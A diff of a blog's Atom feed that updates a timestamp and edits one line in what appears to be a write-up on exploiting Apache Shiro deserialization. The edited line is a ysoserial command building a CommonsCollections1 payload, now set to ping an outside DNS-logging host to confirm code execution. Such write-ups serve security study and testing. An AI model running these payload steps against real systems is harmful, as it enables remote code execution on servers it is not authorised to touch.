@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2019-12-05T06:44:07.154Z</updated>
+    <updated>2019-12-13T01:44:42.454Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com//atom.xml"/>
@@ -55,7 +55,7 @@ Exp：https://xxx.com
 <p>3.生成payload.class</p>
 </li>
 </ul>
-<pre><code>java -jar ysoserial.jar CommonsCollections1 &quot;touch /tmp/shiro.test&quot; &gt; payload.class
+<pre><code>java -jar ysoserial.jar CommonsCollections1 &quot;ping dnslog.com&quot; &gt; payload.class
 </code></pre>
 <ul>
 <li>
